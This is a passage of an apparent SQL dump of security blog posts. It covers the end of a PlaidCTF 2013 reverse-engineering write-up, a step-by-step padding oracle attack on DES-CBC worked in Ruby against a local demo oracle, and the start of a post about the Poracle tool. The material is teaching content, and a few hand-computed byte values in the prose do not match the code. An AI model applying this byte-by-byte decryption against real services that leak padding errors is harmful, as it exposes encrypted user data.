checksums[1]) + count_bits(good_checksums[3] ^ checksums[3])\r\n117   puts(\" Difference: %d\" % diff)\r\n118   puts()\r\n119 \r\n120   # Return the difference so we can save the best one\r\n121   return diff\r\n122 end\r\n123 \r\n124 diffs = {}\r\n125 \r\n126 ?0.upto(?9) do |i|\r\n127   i = i.chr\r\n128 \r\n129   str = \"where u #{i}quenTisTs naME?\"\r\n130     diff = go(str)\r\n131 \r\n132     diffs[diff] = diffs[diff] || []\r\n133     diffs[diff] << \"#{i} :: #{str}\"\r\n134   end\r\n135 end\r\n136 \r\n137 # Print the best option(s)\r\n138 i = 0\r\n139 loop do\r\n140   if(!diffs[i].nil?)\r\n141     puts(\"== #{i} ==\\n#{diffs[i].join(\"\\n\")}\")\r\n142     exit\r\n143   end\r\n144 \r\n145   i += 1\r\n146 end\r\n\nAnd in that particular configuration, the program attempts every possible number for the start of the third word:\n\r\n 1 $ ruby ./cs.rb\r\n 2  String: \'where u 0quenTisTs naME?\'\r\n 3  Expected: faf7f5ff 0a40121f ff77f7f6 fd9e7f5f\r\n 4  Received: fafff5ff 1240021f f377f5e7 fd92ff7f\r\n 5  Difference: 13\r\n 6 \r\n 7  String: \'where u 1quenTisTs naME?\'\r\n 8  Expected: faf7f5ff 0a40121f ff77f7f6 fd9e7f5f\r\n 9  Received: fafff5ff 1240021f f377fde6 fd927fff\r\n10  Difference: 13\r\n11 \r\n12  String: \'where u 2quenTisTs naME?\'\r\n13  Expected: faf7f5ff 0a40121f ff77f7f6 fd9e7f5f\r\n14  Received: fafff5ff 1240021f f377fde6 fd927f7f\r\n15  Difference: 12\r\n16 \r\n17  String: \'where u 3quenTisTs naME?\'\r\n18  Expected: faf7f5ff 0a40121f ff77f7f6 fd9e7f5f\r\n19  Received: fafff5ff 1240021f f777f5f6 fd967f7f\r\n20  Difference: 8\r\n21 \r\n22  String: \'where u 4quenTisTs naME?\'\r\n23  Expected: faf7f5ff 0a40121f ff77f7f6 fd9e7f5f\r\n24  Received: fafff5ff 1240021f f377f5ee ffd27f7f\r\n25  Difference: 14\r\n26 \r\n27  String: \'where u 5quenTisTs naME?\'\r\n28  Expected: faf7f5ff 0a40121f ff77f7f6 fd9e7f5f\r\n29  Received: fbfff5ff 1240021f f37ff5e6 fd927f7f\r\n30  Difference: 13\r\n31 \r\n32  String: \'where u 6quenTisTs naME?\'\r\n33  Expected: faf7f5ff 0a40121f ff77f7f6 fd9e7f5f\r\n34  Received: fafff5ff 1240021f f377fde6 fd927f7f\r\n35  Difference: 12\r\n36 \r\n37  String: \'where u 7quenTisTs naME?\'\r\n38  Expected: faf7f5ff 0a40121f ff77f7f6 fd9e7f5f\r\n39  Received: fefff5ff 1240021f f377f5e6 fd927f7f\r\n40  Difference: 12\r\n41 \r\n42  String: \'where u 8quenTisTs naME?\'\r\n43  Expected: faf7f5ff 0a40121f ff77f7f6 fd9e7f5f\r\n44  Received: fafff5ff 1240021f f3f7f5e6 fdd27f7f\r\n45  Difference: 13\r\n46 \r\n47  String: \'where u 9quenTisTs naME?\'\r\n48  Expected: faf7f5ff 0a40121f ff77f7f6 fd9e7f5f\r\n49  Received: fafff5ff 1240021f f377f5e6 fd927f7f\r\n50  Difference: 11\r\n51 \r\n52 == 8 ==\r\n53 3 :: where u 3quenTisTs naME?\r\n\nAs you can see, the best result we got from this was eight bits different, and the number \'3\' (which tuned out to be correct)!\nWe did this over and over for different letters, occasionally repeating letters if we wound up getting bad results, getting closer. I considered writing an A* search or something, I bet we could have optimized this pretty good, but that turned out to not be necessary. Eventually, I was reasonably sure everything was right except for the last two letters (in \'naME\'), so I decided to try every possible pairing:\n\r\n 1 ?a.upto(?z) do |i|\r\n 2   i = i.chr\r\n 3   ?A.upto(?Z) do |j|\r\n 4     j = j.chr\r\n 5     str = \"where u 3quenTisTs na#{i}#{j}?\"\r\n 6     diff = go(str)\r\n 7 \r\n 8     diffs[diff] = diffs[diff] || []\r\n 9     diffs[diff] &lt;&lt; \"#{i} :: #{str}\"\r\n10   end\r\n11 end\r\n\nAnd eventually, it printed out:\n\r\n 1 $ ruby cs.rb | tail\r\n 2 Received: 7ef7f7ff 0240221f f7f7f5f6 fd96ffff\r\n 3 Difference: 13\r\n 4 \r\n 5 String: \'where u 3quenTisTs nazZ?\'\r\n 6 Expected: faf7f5ff 0a40121f ff77f7f6 fd9e7f5f\r\n 7 Received: 7ef7f5ff 0240421f f777f5fe fd977f7f\r\n 8 Difference: 11\r\n 9 \r\n10 == 0 ==\r\n11 o :: where u 3quenTisTs naoW?\r\n\nThe answer! I punched it into the site, and it worked. omg!!! #bestfeelingever\nConclusion\nI realize this was an extremely long writeup, for an extremely elaborate level. It took a long time to solve, and I was exceptionally proud. Did I mention that, at 450 points, it was the most valuable flag in the entire competition?\nJust to go over what I had to overcome:\n\nAnti-debugging\nAnti-reversing (obfuscation)\nMore code obfuscation\nA series of \"letter n is between x and y\" type solutions, instead of actual \"this letter is z\" solutions\nCrazy checksums that, it turns out, used Fibonacci sequences (I never did reverse them)\n\nAnd that\'s cnot in a nutshell. Thanks for reading!', '\'Hacking\', \'PlaidCTF 2013\', \'Reverse Engineering\'', 'https://blog.skullsecurity.org/2013/epic-cnot-writeup-plaidctf');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (36, 'A padding oracle example', 'Ron Bowes', '2013-1-7', 'Early last week, I posted a blog about padding oracle attacks. I explained them in detail, as simply as I could (without making diagrams, I suck at diagrams). I asked on Reddit about how I could make it easier to understand, and JoseJimeniz suggested working through an example. I thought that was a neat idea, and working through a padding oracle attack by hand seems like a fun exercise!\n(Having done it already and writing this introduction afterwards, I can assure you that it isn\'t as fun as I thought it\'d be :) )\nI\'m going to assume that you\'ve read my previous blog all the way through, and jump right into things!\n\nThe setup\nAs an example, let\'s assume we\'re using DES, since it has nice short block sizes. We\'ll use the following variables:\n\r\n  P   = Plaintext (with the padding added)\r\n  Pn  = The nth block of plaintext\r\n  N   = The number of blocks of either plaintext or ciphertext (the number is the same)\r\n  IV  = Initialization vector\r\n  E() = Encrypt, using a given key (we don\'t notate the key for reasons of simplicity)\r\n  D() = Decrypt, using the same key as E()\r\n  C   = Ciphertext\r\n  Cn  = The nth block of ciphertext\r\n\nWe use the following values for the variables:\n\r\n  P   = \"Hello World\\x05\\x05\\x05\\x05\\x05\"\r\n  P1  = \"Hello Wo\"\r\n  P2  = \"rld\\x05\\x05\\x05\\x05\\x05\"\r\n  N   = 2\r\n  IV  = \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\r\n  E() = des-cbc with the key \"mydeskey\"\r\n  D() = des-cbc with the key \"mydeskey\"\r\n  C   = \"\\x83\\xe1\\x0d\\x51\\xe6\\xd1\\x22\\xca\\x3f\\xaf\\x08\\x9c\\x7a\\x92\\x4a\\x7b\"\r\n  C1  = \"\\x83\\xe1\\x0d\\x51\\xe6\\xd1\\x22\\xca\"\r\n  C2  = \"\\x3f\\xaf\\x08\\x9c\\x7a\\x92\\x4a\\x7b\"\r\n\nFor what it\'s worth, I generated the ciphertext like this:\n\r\n  irb(main):001:0>; require \'openssl\'\r\n  irb(main):002:0>; c = OpenSSL::Cipher::Cipher.new(\'des-cbc\')\r\n  irb(main):003:0>; c.encrypt\r\n  irb(main):004:0>; c.key = \"mydeskey\"\r\n  irb(main):005:0>; c.iv = \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\r\n  irb(main):006:0>; data = c.update(\"Hello World\") + c.final\r\n  irb(main):007:0>; data.unpack(\"H*\")\r\n  => [\"83e10d51e6d122ca3faf089c7a924a7b\"]\r\n\nNow that we have our variables, let\'s get started!\nCreating an oracle\nAs I explained in my previous blog, this attack relies on having a decryption oracle that\'ll return a true/false value depending on whether or not the decryption operation succeeded. Here\'s a workable oracle that, albeit unrealistic, will be a perfect demonstration:\n\r\n  irb(main):012:0> def try_decrypt(data)\r\n  irb(main):013:1>   begin\r\n  irb(main):014:2>     c = OpenSSL::Cipher::Cipher.new(\'des-cbc\')\r\n  irb(main):015:2>     c.decrypt\r\n  irb(main):016:2>     c.key = \"mydeskey\"\r\n  irb(main):017:2>     c.iv = \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\r\n  irb(main):018:2>     c.update(data)\r\n  irb(main):019:2>     c.final\r\n  irb(main):020:2>     return true\r\n  irb(main):021:2>   rescue OpenSSL::Cipher::CipherError\r\n  irb(main):022:2>     return false\r\n  irb(main):023:2>   end\r\n  irb(main):024:1> end\r\n\nAs you can see, it returns true if we send C:\n\r\n  irb(main):025:0> try_decrypt(\"\\x83\\xe1\\x0d\\x51\\xe6\\xd1\\x22\\xca\\x3f\\xaf\\x08\\x9c\\x7a\r\n  \\x92\\x4a\\x7b\")\r\n  => true\r\n\nAnd false if we flip the last bit of C (effectively changing the padding):\n\r\n  irb(main):026:0> try_decrypt(\"\\x83\\xe1\\x0d\\x51\\xe6\\xd1\\x22\\xca\\x3f\\xaf\\x08\\x9c\\x7a\r\n   \\x92\\x4a\\x7a\")\r\n  => false\r\n\nNow we have our data, our encrypted data, and a simple oracle. Let\'s get to work!\nBreaking the last character\nNow, let\'s start with breaking the second block of ciphertext, C2. The first thing we do is create our own block of ciphertext — C′ — which has no particular plaintext value:\n\r\n  C′ = \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\r\n\nIn reality, we can use any value, but all zeroes makes it easier to demonstrate. We concatenate C2 to that block, giving us:\n\r\n  C′ || C2 = \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x3f\\xaf\\x08\\x9c\\x7a\\x92\\x4a\\x7b\"\r\n\nWe now have a two-block string of ciphertext. When you send that string to the oracle, the oracle will, following the cipher-block chaining standard: a) decrypt the second block, b) XOR the decrypted block with the ciphertext block that we control, and c) check the padding on the resulting block and fail if it\'s wrong. Read that sentence a couple times. If you need to know one thing to understand padding oracles, it\'s that.\nLet me repeat and rephrase, to make sure it\'s clear: We send two blocks of ciphertext, one we control (C′) and one we want to decrypt (C2). The one we want to decrypt (C2) is decrypted (secretly) by the server, XORed with the block we control (C′), then the resulting plaintext\'s padding is validated. That means that we know whether or not our ciphertext XORed with their plaintext has proper padding. That gives us enough information to decrypt the entire string, one character after the other!\nThis will, of course, work for blocks other than C2 (which I notate as Cn in the previous blog). I\'m using C2 because I\'m working through a concrete example.\nSo, we generate that string (C′ || C2). We send that to our decryption oracle, and should return a false result (unless we hit the 1/256 chance of getting the padding right at random, which we don\'t):\n\r\n  irb(main):027:0> try_decrypt(\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x3f\\xaf\\x08\\x9c\r\n   \\x7a\\x92\\x4a\\x7b\")\r\n  => false\r\n\nNow, keep in mind that this isn\'t decrypting to anything remotely useful! It\'s decrypting to a garbage string, and all that matters to us is whether or not the padding is correct, because that, thanks to a beautiful formula, tells us something about the plaintext.\nLet\'s now focus on just the last character of C′. Before we get to the math, let\'s find the value for the last byte of C′ — C′[8] — that returns valid padding, using a simple ruby script:\n\r\n  irb(main):067:0> 0.upto(255) do |i|\r\n  irb(main):068:1*   cprime = \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00#{i.chr}\" + \r\n   \"\\x3f\\xaf\\x08\\x9c\\x7a\\x92\\x4a\\x7b\"\r\n  irb(main):069:1>   puts(\"#{i}: #{cprime.unpack(\"H*\")}: #{try_decrypt(cprime)}\")\r\n  irb(main):070:1> end\r\n  0: 00000000000000003faf089c7a924a7b: false\r\n  1: 00000000000000013faf089c7a924a7b: false\r\n  2: 00000000000000023faf089c7a924a7b: false\r\n  3: 00000000000000033faf089c7a924a7b: false\r\n  4: 00000000000000043faf089c7a924a7b: false\r\n  5: 00000000000000053faf089c7a924a7b: false\r\n  6: 00000000000000063faf089c7a924a7b: false\r\n  7: 00000000000000073faf089c7a924a7b: false\r\n  ...\r\n  203: 00000000000000cb3faf089c7a924a7b: false\r\n  204: 00000000000000cc3faf089c7a924a7b: false\r\n  205: 00000000000000cd3faf089c7a924a7b: false\r\n  206: 00000000000000ce3faf089c7a924a7b: true   <--\r\n  207: 00000000000000cf3faf089c7a924a7b: false\r\n  208: 00000000000000d03faf089c7a924a7b: false\r\n  ...\r\n\nSo what did we learn here? That when C′[8] is 206 — 0xce — it decrypts to something that ends with the byte \"\\x01\". We can see what it\'s decrypting to by using some more ruby code (note that this isn\'t possible in a normal attack, since we don\'t have access to the key, this is simply used as a demonstration):\n\r\n  irb(main):075:0> puts (c.update(\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xce\\x3f\\xaf\\x08\\x9c\r\n  \\x7a\\x92\\x4a\\x7b\") + c.final).unpack(\"H*\")\r\n  62047db89b8144b8f18d6954e3d427\r\n\nNote that this string is 15 characters long, and doesn\'t end with \\x01. Why? Because the \"\\x01\" on the end was considered to be padding by the library and removed. OpenSSL doesn\'t return padding to the programmer — why would it?\nWe refer to this garbage string as P′, and it\'s not useful to us in any way, except for the padding byte that the server validates. In fact, since the server is decrypting the string secretly, we never even have access to P′.\n(For what it\'s worth, P′ is actually equal to the original block of plaintext (P2) XORed with the previous block of ciphertext (C1) and XORed with our ciphertext block (C′). If you work through the math, you\'ll discover why).\nThe math\nRecall from my previous blog that the second block of our new plaintext value — P′2 — is calculated like this:\n\r\n  P′2 = D(C2) ⊕ C′\r\n\nThat is, the second block of P′ — our newly and secretly decrypted string — is equal to the second block of the ciphertext decrypted, then XORed with C′.\nBut C2 was originally calculated like this:\n\r\n  C2 = E(P2 ⊕ C1)\r\n\nIn other words, the second block of ciphertext is the second block of plaintext XORed with the first block of ciphertext, then encrypted.\nWe can substitute C2 in the first formula with C2 in the second formula, which results in this:\n\r\n  P′2 = D(E(P2 ⊕ C1)) ⊕ C′\r\n\nSo, the server calculates P2 XORed with C1, then encrypts it, decrypts it, and XORs it with C′. But the encryption and decryption cancel out (D(E(x)) = x, by definition), so we can reduce the formula to this:\n\r\n  P′2 = P2 ⊕ C1 ⊕ C′\r\n\nSo P′2 — the value whose padding we\'re trying to discover — is the second block of plaintext XORed with the first block of ciphertext, XORed with our ciphertext (C′).\nWhat do we know about P′2? Well, once we discover the proper padding value, the server knows that the value of P′2 is \"\\xf1\\x8d\\x69\\x54\\xe3\\xd4\\x27\\x01\". Unfortunately, all we know is that the padding is correct, and that P′2[8] = \"\\x01\". But, since we know the value of P′2[8], we know enough to calculate P2[8]! Here\'s the calculation:\n\r\n  P′2[8] = P2[8] ⊕ C1[8] ⊕ C′[8]\r\n  (re-arrange using XOR\'s commutative property):\r\n  P2[8] = P′2[8] ⊕ C1[8] ⊕ C′[8]\r\n  P2[8] = 0x01 ⊕ 0xca ⊕ 0xce\r\n  P2[8] = 5\r\n\nHoly crap! 5 is the last byte of padding! We just broke the last byte of plaintext!\nThe value we know for P2 is \"???????\\x05\"\nSecond-last byte...\nNow, to calculate the second-last byte, we need a new P′. We want the last byte of P′ to decrypt to 0x02 (so that our padding will wind up as \"\\x02\\x02\" once we bruteforce the second-last byte), so we use this formula from earlier:\n\r\n  P′2[k] = P2[k] ⊕ C1[k] ⊕ C′[k]\r\n\nAnd re-arrange it:\n\r\n  C′[k] = P′2[k] ⊕ P2[k] ⊕ C1[k]\r\n\nThen plug in the values we determined for P2[8] ⊕ C1[8], and the value we desire for P′2[8]:\n\r\n  C′[8] = P′2[8] ⊕ P2[8] ⊕ C1[8]\r\n  C′[8] = 0x02 ⊕ 0x05 ⊕ 0xca\r\n  C′[8] = 0xcd\r\n\nNow we have the last character of C′: 0xcd. We use the same loop from earlier, except guessing C′[7] instead of C′[8]:\n\r\n  irb(main):076:0> 0.upto(255) do |i|\r\n  irb(main):077:1>   cprime = \"\\x00\\x00\\x00\\x00\\x00\\x00#{i.chr}\\xcd\" + \r\n  \"\\x3f\\xaf\\x08\\x9c\\x7a\\x92\\x4a\\x7b\"\r\n  irb(main):078:1>   puts(\"#{i}: #{cprime.unpack(\"H*\")}: #{try_decrypt(cprime)}\")\r\n  irb(main):079:1> end\r\n  ...\r\n  36: 00000000000024cd3faf089c7a924a7b: false\r\n  37: 00000000000025cd3faf089c7a924a7b: true\r\n  38: 00000000000026cd3faf089c7a924a7b: false\r\n  ...\r\n\nAll right, now we know that when C′[7] = 0x25, P′2[7] = 0x02! Plug that back into our formula:\n\r\n  P2[7] = P′2[7] ⊕ C1[7] ⊕ C′[7]\r\n  P2[7] = 0x02 ⊕ 0x22 ⊕ 0x25\r\n  P2[7] = 5\r\n\nBoom! Now we know that the second-last character of P2 is 5.\nThe value we know for P2 is \"??????\\x05\\x05\"\nThird-last character\nLet\'s keep going! First, we calculate C′[7] and C′[8] such that P′ will end with \"\\x03\\x03\":\n\r\n  C′[k] = P′2[k] ⊕ P2[k] ⊕ C1[k]\r\n\r\n  C′[8] = P′2[8] ⊕ P2[8] ⊕ C1[8]\r\n  C′[8] = 0x03 ⊕ 0x05 ⊕ 0xca\r\n  C′[8] = 0xcc\r\n\r\n  C′[7] = P′2[7] ⊕ P2[7] ⊕ C1[7]\r\n  C′[7] = 0x03 ⊕ 0x05 ⊕ 0x22\r\n  C′[7] = 0x24\r\n\nAnd run our program (modified a bit to just show us what\'s interesting):\n\r\n  irb(main):088:0> 0.upto(255) do |i|\r\n  irb(main):089:1>   cprime = \"\\x00\\x00\\x00\\x00\\x00#{i.chr}\\x24\\xcc\" +\r\n  \"\\x3f\\xaf\\x08\\x9c\\x7a\\x92\\x4a\\x7b\"\r\n  irb(main):090:1>   puts(\"#{i}: #{cprime.unpack(\"H*\")}\") if(try_decrypt(cprime))\r\n  irb(main):091:1> end\r\n  215: 0000000000d724cc3faf089c7a924a7b\r\n\nAnd back to our formula:\n\r\n  P2[6] = P′2[6] ⊕ C1[6] ⊕ C′[6]\r\n  P2[6] = 0x03 ⊕ 0xd1 ⊕ 0xd7\r\n  P2[6] = 5\r\n\nThe value we know for P2 is \"?????\\x05\\x05\\x05\"\nFourth-last character\nCalculate the C′ values for \\x04\\x04\\x04:\n\r\n  C′[k] = P′2[k] ⊕ P2[k] ⊕ C1[k]\r\n\r\n  C′[8] = P′2[8] ⊕ P2[8] ⊕ C1[8]\r\n  C′[8] = 0x04 ⊕ 0x05 ⊕ 0xca\r\n  C′[8] = 0xcb\r\n\r\n  C′[7] = P′2[7] ⊕ P2[7] ⊕ C1[7]\r\n  C′[7] = 0x04 ⊕ 0x05 ⊕ 0x22\r\n  C′[7] = 0x23\r\n\r\n  C′[6] = P′2[6] ⊕ P2[6] ⊕ C1[6]\r\n  C′[6] = 0x04 ⊕ 0x05 ⊕ 0xd1\r\n  C′[6] = 0xd0\r\n\nAnd our program:\n\r\n  irb(main):092:0> 0.upto(255) do |i|\r\n  irb(main):093:1>   cprime = \"\\x00\\x00\\x00\\x00#{i.chr}\\xd0\\x23\\xcb\" + \r\n  \"\\x3f\\xaf\\x08\\x9c\\x7a\\x92\\x4a\\x7b\"\r\n  irb(main):094:1>   puts(\"#{i}: #{cprime.unpack(\"H*\")}\") if(try_decrypt(cprime))\r\n  irb(main):095:1> end\r\n  231: 00000000e7d023cb3faf089c7a924a7b\r\n\nAnd breaking it:\n\r\n  P2[5] = P′2[5] ⊕ C1[5] ⊕ C′[5]\r\n  P2[5] = 0x04 ⊕ 0xe6 ⊕ 0xe7\r\n  P2[5] = 5\r\n\nThe value we know for P2 is \"????\\x05\\x05\\x05\\x05\"\nFifth-last character\nTime for the last padding character! Calculate C′ values for \\x05\\x05\\x05\\x05:\n\r\n  C′[k] = P′2[k] ⊕ P2[k] ⊕ C1[k]\r\n\r\n  C′[8] = P′2[8] ⊕ P2[8] ⊕ C1[8]\r\n  C′[8] = 0x05 ⊕ 0x05 ⊕ 0xca\r\n  C′[8] = 0xca\r\n\r\n  C′[7] = P′2[7] ⊕ P2[7] ⊕ C1[7]\r\n  C′[7] = 0x05 ⊕ 0x05 ⊕ 0x22\r\n  C′[7] = 0x22\r\n\r\n  C′[6] = P′2[6] ⊕ P2[6] ⊕ C1[6]\r\n  C′[6] = 0x05 ⊕ 0x05 ⊕ 0xd1\r\n  C′[6] = 0xd1\r\n\r\n  C′[5] = P′2[5] ⊕ P2[5] ⊕ C1[5]\r\n  C′[5] = 0x05 ⊕ 0x05 ⊕ 0xe6\r\n  C′[5] = 0xe6\r\n\nRun the program:\n\r\n  irb(main):096:0> 0.upto(255) do |i|\r\n  irb(main):097:1*   cprime = \"\\x00\\x00\\x00#{i.chr}\\xe6\\xd1\\x22\\xca\" + \r\n \"\\x3f\\xaf\\x08\\x9c\\x7a\\x92\\x4a\\x7b\"\r\n  irb(main):098:1>   puts(\"#{i}: #{cprime.unpack(\"H*\")}\") if(try_decrypt(cprime))\r\n  irb(main):099:1> end\r\n  81: 00000051e6d122ca3faf089c7a924a7b\r\n\nAnd break the character:\n\r\n  P2[4] = P′2[4] ⊕ C1[4] ⊕ C′[4]\r\n  P2[4] = 0x05 ⊕ 0x51 ⊕ 0x51\r\n  P2[4] = 5\r\n\nThe value we know for P2 is \"???\\x05\\x05\\x05\\x05\\x05\"\nSixth-last character\nOnly three to go! Calculate C′ for \\x06\\x06\\x06\\x06\\x06:\n\r\n  C′[k] = P′2[k] ⊕ P2[k] ⊕ C1[k]\r\n\r\n  C′[8] = P′2[8] ⊕ P2[8] ⊕ C1[8]\r\n  C′[8] = 0x06 ⊕ 0x05 ⊕ 0xca\r\n  C′[8] = 0xc9\r\n\r\n  C′[7] = P′2[7] ⊕ P2[7] ⊕ C1[7]\r\n  C′[7] = 0x06 ⊕ 0x05 ⊕ 0x22\r\n  C′[7] = 0x21\r\n\r\n  C′[6] = P′2[6] ⊕ P2[6] ⊕ C1[6]\r\n  C′[6] = 0x06 ⊕ 0x05 ⊕ 0xd1\r\n  C′[6] = 0xd2\r\n\r\n  C′[5] = P′2[5] ⊕ P2[5] ⊕ C1[5]\r\n  C′[5] = 0x06 ⊕ 0x05 ⊕ 0xe6\r\n  C′[5] = 0xe5\r\n\r\n  C′[4] = P′2[4] ⊕ P2[4] ⊕ C1[4]\r\n  C′[4] = 0x06 ⊕ 0x05 ⊕ 0x51\r\n  C′[4] = 0x52\r\n\nRun the program:\n\r\n  irb(main):100:0> 0.upto(255) do |i|\r\n  irb(main):101:1*   cprime = \"\\x00\\x00#{i.chr}\\x52\\xe5\\xd2\\x21\\xc9\" + \r\n  \"\\x3f\\xaf\\x08\\x9c\\x7a\\x92\\x4a\\x7b\"\r\n  irb(main):102:1>   puts(\"#{i}: #{cprime.unpack(\"H*\")}\") if(try_decrypt(cprime))\r\n  irb(main):103:1> end\r\n  111: 00006f52e5d221c93faf089c7a924a7b\r\n\nBreak the character:\n\r\n  P2[3] = P′2[3] ⊕ C1[3] ⊕ C′[3]\r\n  P2[3] = 0x06 ⊕ 0x0d ⊕ 0x6f\r\n  P2[3] = 0x64 = \"d\"\r\n\nThe value we know for P2 is \"??d\\x05\\x05\\x05\\x05\\x05\"\nTwo left!\nOnly two left! Time to calculate C′ for \"\\x07\\x07\\x07\\x07\\x07\\x07\":\n\r\n  C′[k] = P′2[k] ⊕ P2[k] ⊕ C1[k]\r\n\r\n  C′[8] = P′2[8] ⊕ P2[8] ⊕ C1[8]\r\n  C′[8] = 0x07 ⊕ 0x05 ⊕ 0xca\r\n  C′[8] = 0xc9\r\n\r\n  C′[7] = P′2[7] ⊕ P2[7] ⊕ C1[7]\r\n  C′[7] = 0x07 ⊕ 0x05 ⊕ 0x22\r\n  C′[7] = 0x21\r\n\r\n  C′[6] = P′2[6] ⊕ P2[6] ⊕ C1[6]\r\n  C′[6] = 0x07 ⊕ 0x05 ⊕ 0xd1\r\n  C′[6] = 0xd2\r\n\r\n  C′[5] = P′2[5] ⊕ P2[5] ⊕ C1[5]\r\n  C′[5] = 0x07 ⊕ 0x05 ⊕ 0xe6\r\n  C′[5] = 0xe5\r\n\r\n  C′[4] = P′2[4] ⊕ P2[4] ⊕ C1[4]\r\n  C′[4] = 0x07 ⊕ 0x05 ⊕ 0x51\r\n  C′[4] = 0x52\r\n\r\n  C′[3] = P′2[3] ⊕ P2[3] ⊕ C1[3]\r\n  C′[3] = 0x07 ⊕ 0x64 ⊕ 0x0d\r\n  C′[3] = 0x52\r\n\nThe program:\n\r\n  irb(main):104:0> 0.upto(255) do |i|\r\n  irb(main):105:1*   cprime = \"\\x00#{i.chr}\\x6e\\x53\\xe4\\xd3\\x20\\xc8\" + \r\n  \"\\x3f\\xaf\\x08\\x9c\\x7a\\x92\\x4a\\x7b\"\r\n  irb(main):106:1>   puts(\"#{i}: #{cprime.unpack(\"H*\")}\") if(try_decrypt(cprime))\r\n  irb(main):107:1> end\r\n  138: 008a6e53e4d320c83faf089c7a924a7b\r\n\nThe calculation:\n\r\n  P2[2] = P′2[2] ⊕ C1[2] ⊕ C′[2]\r\n  P2[2] = 0x07 ⊕ 0xe1 ⊕ 0x8a\r\n  P2[2] = 0x6c = \"l\"\r\n\nThe value we know for P2 is \"?ld\\x05\\x05\\x05\\x05\\x05\"\nLast block!\nFor the last block — and the last time I ever do a padding oracle calculation by hand — we calculate C′ for \"\\x08\\x08\\x08\\x08\\x08\\x08\\x08\":\n\r\n  C′[k] = P′2[k] ⊕ P2[k] ⊕ C1[k]\r\n\r\n  C′[8] = P′2[8] ⊕ P2[8] ⊕ C1[8]\r\n  C′[8] = 0x08 ⊕ 0x05 ⊕ 0xca\r\n  C′[8] = 0xc7\r\n\r\n  C′[7] = P′2[7] ⊕ P2[7] ⊕ C1[7]\r\n  C′[7] = 0x08 ⊕ 0x05 ⊕ 0x22\r\n  C′[7] = 0x2f\r\n\r\n  C′[6] = P′2[6] ⊕ P2[6] ⊕ C1[6]\r\n  C′[6] = 0x08 ⊕ 0x05 ⊕ 0xd1\r\n  C′[6] = 0xdc\r\n\r\n  C′[5] = P′2[5] ⊕ P2[5] ⊕ C1[5]\r\n  C′[5] = 0x08 ⊕ 0x05 ⊕ 0xe6\r\n  C′[5] = 0xeb\r\n\r\n  C′[4] = P′2[4] ⊕ P2[4] ⊕ C1[4]\r\n  C′[4] = 0x08 ⊕ 0x05 ⊕ 0x51\r\n  C′[4] = 0x5c\r\n\r\n  C′[3] = P′2[3] ⊕ P2[3] ⊕ C1[3]\r\n  C′[3] = 0x08 ⊕ 0x64 ⊕ 0x0d\r\n  C′[3] = 0x61\r\n\r\n  C′[2] = P′2[2] ⊕ P2[2] ⊕ C1[2]\r\n  C′[2] = 0x08 ⊕ 0x6c ⊕ 0xe1\r\n  C′[2] = 0x85\r\n\nThen the program:\n\r\n  irb(main):112:0> 0.upto(255) do |i|\r\n  irb(main):113:1*   cprime = \"#{i.chr}\\x85\\x61\\x5c\\xeb\\xdc\\x2f\\xc7\" + \r\n  \"\\x3f\\xaf\\x08\\x9c\\x7a\\x92\\x4a\\x7b\"\r\n  irb(main):114:1>   puts(\"#{i}: #{cprime.unpack(\"H*\")}\") if(try_decrypt(cprime))\r\n  irb(main):115:1> end\r\n  249: f985615cebdc2fc73faf089c7a924a7b\r\n\nAnd, finally, we calculate the character one last time:\n\r\n  P2[1] = P′2[1] ⊕ C1[1] ⊕ C′[1]\r\n  P2[1] = 0x08 ⊕ 0x83 ⊕ 0xf9\r\n  P2[1] = 0x72 = \"r\"\r\n\nThe value we know for P2 is \"rld\\x05\\x05\\x05\\x05\\x05\"\nConclusion\nSo, you\'ve seen the math behind how we can decrypt a full block of a CBC cipher (specifically, DES) using only a padding oracle. The previous block would be decrypted the exact same way, and would wind up as \"Hello Wo\". \nHopefully this demonstration will help you understand what\'s going on! Padding oracles, once you really understand them, are one of the simplest vulnerabilities to exploit!', '\'Crypto\', \'Hacking\'', 'https://blog.skullsecurity.org/2013/a-padding-oracle-example');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (37, 'Padding oracle attacks: in depth', 'Ron Bowes', '2013-1-2', 'This post is about padding oracle vulnerabilities and the tool for attacking them - \"Poracle\" I\'m officially releasing right now. You can grab the Poracle tool on Github!\nAt my previous job — Tenable Network Security — one of the first tasks I ever had was to write a vulnerability check for MS10-070 — a padding oracle vulnerability in ASP.net. It\'s an interesting use of a padding oracle vulnerability, since it leads to code execution, but this blog is going to be a more general overview of padding oracles. When I needed to test this vuln, I couldn\'t find a good writeup on how they work. The descriptions I did find were very technical and academic, which I\'m no good at. In fact, when it comes to reading academic papers, I\'m clueless and easily frightened. But, I struggled through them, and now I\'m gonna give you a writeup that even I\'d be able to understand!\nBy the way, the Wikipedia page for this attack isn\'t very good. If somebody wants to summarize my blog and make it into a Wikipedia page, there\'s now a source you can reference. :)\nOn a related note, I\'m gonna be speaking at Shmoocon in February: \"Crypto: You\'re doing it wrong\". Among other things, I plan to talk about padding oracles and hash extension attacks — I\'m really getting into this crypto thing!\n\nOverview\nPadding oracle attacks — also known as Vaudenay attacks — were originally published in 2002 by Serge Vaudenay. As I mentioned earlier, in 2010 it was used for code execution in ASP.net.\nFirst, let\'s look at the definition of an \"oracle\". This has nothing to do with the Oracle database or the company that makes Java — they have enough vulnerabilities of their own without this one (well, actually, Java Server Faces ironically suffered from a padding oracle vulnerability, but I think that\'s before Oracle owned them). In cryptography, an oracle — much like the Oracle of Delphi — is a system that will perform given cryptographic operations on behalf of the user (otherwise known as the attacker). A padding oracle is a specific type of oracle that will take encrypted data from the user, attempt to decrypt it privately, then reveal whether or not the padding is correct. We\'ll get into what padding is and why it matters soon enough.\nExample\nOkay, so we need an oracle that will decrypt arbitrary data, secretly. When the heck does that happen?\nWell, it turns out, it happens a lot. Every time there\'s an encrypted connection, in fact, one side is sending the other data that the latter attempts to decrypt. Of course, to do anything interesting in that situation, it requires a man-in-the-middle attack — or something 